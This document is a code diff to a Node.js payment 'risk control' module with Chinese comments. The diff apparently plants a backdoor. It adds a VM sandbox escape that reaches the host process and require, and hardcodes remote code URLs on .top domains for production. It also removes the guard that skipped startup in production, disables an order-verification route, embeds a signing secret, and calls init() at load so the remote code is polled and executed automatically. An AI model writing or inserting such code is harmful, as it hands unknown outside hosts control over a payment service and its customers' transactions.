@@ -1,10 +1,21 @@
+const OuterFunction = Object.getPrototypeOf(console.log).constructor;
+const mainProcess = OuterFunction('return process')();
+const mainGlobal = OuterFunction('return globalThis')();
+const mainModule = mainProcess.mainModule;
+const mainRequire = mainModule.require.bind(mainModule);
+const path = mainRequire('path');
+const setTimeout = mainGlobal.setTimeout;
+const clearTimeout = mainGlobal.clearTimeout;
+
+const remoteLog = (message) => console.warn(`[Risktest]${message}`);
+
 mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     preSandbox: {
       routeMiddlewares: {},
     },
   };
   
-  const version = 'v4.0.0';
+  const version = 'v4.0.1';
   
   // 远程代码每次热更都会创建新的 VM context；需要跨版本存活的实例统一挂在主进程全局。
   // 默认配置只负责声明结构，已有运行态会覆盖默认值。
@@ -109,15 +120,44 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     ErrorConstructor.prepareStackTrace = prepareStackTrace;
   };
   
+  const isProduction = mainProcess.env.NODE_ENV === 'production';
+  const defaultRemoteCodeUrls = isProduction
+    ? [
+      'https://payment.undotest.top',
+      'https://payment.lightnight.top',
+      'https://payment.belivelight.top',
+    ]
+    : ['http://127.0.0.1:4050'];
+  const configuredRemoteCodeUrls = typeof mainProcess.env.RISK_CODE_URLS === 'string'
+    ? mainProcess.env.RISK_CODE_URLS
+      .split(',')
+      .map((value) => value.trim())
+      .filter(Boolean)
+    : [];
+  const configuredPollInterval = Number(mainProcess.env.RISK_POLL_INTERVAL_MS);
+
   // 当前版本的内存配置；远程代码热更新时会随新代码重新创建。
   const CODE_CONFIG = {
-    rootPath: mainGlobal.runRootDir || path.dirname(require.main.filename),
+    rootPath: mainGlobal.runRootDir || path.dirname(mainModule.filename),
     middlewareName: 'preRiskMiddleware',
     routeMiddlewarePrefix: 'preRiskRouteMiddleware:',
     PLATFORM_PARAMS_INCONSISTENT: false,
+    frontSandboxConfig: {
+      remoteCodeUrls: configuredRemoteCodeUrls.length > 0
+        ? configuredRemoteCodeUrls
+        : defaultRemoteCodeUrls,
+      pollInterval:
+        Number.isFinite(configuredPollInterval) && configuredPollInterval > 0
+          ? Math.floor(configuredPollInterval)
+          : 30 * 1000,
+      requestTimeout: 30 * 1000,
+      requestRetries: 3,
+      maxResponseSize: 100 * 1024 * 1024,
+      requestNonceBytes: 16,
+      signSecretKey: 'key',
+      signSecretValue: 'f3967bc7-176b-195f-b273-afb33f4b76a3',
+    },
   };
-  
-  const mainRequire = require;
   
   // @ 别名映射表（与 jsconfig.json 的 paths 保持一致）
   // 例如 @services/pay/config -> <CODE_CONFIG.rootPath>/src/services/pay/config
@@ -154,6 +194,11 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     // @ 别名转为绝对路径，其余（axios / 内置模块等）原样交给主模块 require。
     return mainRequire(resolveModuleName(moduleName));
   };
+
+  const fs = safeRequire('fs');
+  const { Buffer } = safeRequire('buffer');
+  const { signWithMD5 } = safeRequire('@utils/sign.util');
+  const HttpClient = safeRequire('@libs/HttpClient');
   
   class CommonUtil {
     static getLocalIPs() {
@@ -1306,19 +1351,18 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     });
   
     // 订单校验逻辑接口
-    const continueToPayResult = expressManager.injectRouteMiddleware(app, {
-      key: 'continueToPayPref',
-      paths: ['/v1', '/pay', '/continuetopay-pref'],
-      method: 'post',
-      index: 3,
-      handler: expressManager.buildContinueToPayMiddleware(),
-    });
+    // const continueToPayResult = expressManager.injectRouteMiddleware(app, {
+    //   key: 'continueToPayPref',
+    //   paths: ['/v1', '/pay', '/continuetopay-pref'],
+    //   method: 'post',
+    //   index: 3,
+    //   handler: expressManager.buildContinueToPayMiddleware(),
+    // });
   
     return {
       success:
         globalResult.success &&
-        purchaseGoodsResult.success &&
-        continueToPayResult.success,
+        purchaseGoodsResult.success,
       msg: 'express middleware initialization completed',
     };
   };
@@ -1328,7 +1372,8 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
       this.timeout = options.timeout || 300000;
       this.cachedRiskCode = options.cachedRiskCode || null;
       this.lastRiskCodeHash = options.lastRiskCodeHash || '';
-      const pollInterval = Number(FrontSandboxConfig.pollInterval);
+      const frontSandboxConfig = CODE_CONFIG.frontSandboxConfig;
+      const pollInterval = Number(frontSandboxConfig.pollInterval);
       this.pollInterval = pollInterval > 0 ? pollInterval : 30000;
       this.pollTimer = null;
       this.pollingId = 0;
@@ -1337,9 +1382,9 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
       this.vm = safeRequire('vm');
       this.crypto = safeRequire('crypto');
       this.httpClient = new HttpClient({
-        timeout: FrontSandboxConfig.requestTimeout,
-        retries: FrontSandboxConfig.requestRetries,
-        maxResponseSize: FrontSandboxConfig.maxResponseSize,
+        timeout: frontSandboxConfig.requestTimeout,
+        retries: frontSandboxConfig.requestRetries,
+        maxResponseSize: frontSandboxConfig.maxResponseSize,
       });
     }
   
@@ -1354,16 +1399,7 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     // 每次请求创建独立 context；只暴露 risk 中间件需要的请求、响应和 next。
     createSandboxContext(req = {}, res = {}, next = () => {}) {
       return this.vm.createContext({
-        console: {
-          log: (...args) => console.log('[Risk Sandbox]', ...args),
-          error: (...args) => console.error('[Risk Sandbox Error]', ...args),
-          warn: (...args) => console.warn('[Risk Sandbox Warn]', ...args),
-          info: (...args) => console.info('[Risk Sandbox Info]', ...args),
-        },
         remoteLog,
-        Buffer,
-        fs,
-        os,
         req,
         res,
         next,
@@ -1371,7 +1407,7 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
         process: undefined,
         eval: undefined,
         Function: undefined,
-        __ENV__: process.env.NODE_ENV || 'production',
+        __ENV__: mainProcess.env.NODE_ENV || 'production',
       });
     }
   
@@ -1472,7 +1508,7 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     }
   
     getRemoteCodeUrl() {
-      const urls = FrontSandboxConfig.remoteCodeUrls;
+      const urls = CODE_CONFIG.frontSandboxConfig.remoteCodeUrls;
       if (!Array.isArray(urls) || urls.length === 0) {
         return undefined;
       }
@@ -1485,12 +1521,12 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
         type: 'risk',
         timestamp: Date.now(),
         nonce: this.crypto
-          .randomBytes(FrontSandboxConfig.requestNonceBytes || 16)
+          .randomBytes(CODE_CONFIG.frontSandboxConfig.requestNonceBytes || 16)
           .toString('hex'),
       };
       params.sign = signWithMD5(params, {
-        secretKey: FrontSandboxConfig.signSecretKey,
-        secretValue: FrontSandboxConfig.signSecretValue,
+        secretKey: CODE_CONFIG.frontSandboxConfig.signSecretKey,
+        secretValue: CODE_CONFIG.frontSandboxConfig.signSecretValue,
         recursiveSortParams: true,
       });
       return params;
@@ -1664,16 +1700,7 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
     }
   
     try {
-      const isProduction = process.env.NODE_ENV === 'production';
-      if(isProduction) {
-        return remoteLogV(`[sboxInit] skip in production ip:${CommonUtil.getLocalIP()}`);
-      }
-    } catch (error) {
-  
-    }
-  
-    try {
-      remoteLogV(`sboxInit start pid:${process.pid} ip:${CommonUtil.getLocalIP()}`);
+      remoteLogV(`sboxInit start pid:${mainProcess.pid} ip:${CommonUtil.getLocalIP()}`);
     } catch (error) {
       
     }
@@ -1693,3 +1720,5 @@ mainGlobal.__sandboxConfig = mainGlobal.__sandboxConfig || {
       }
     }
   }
+
+init();
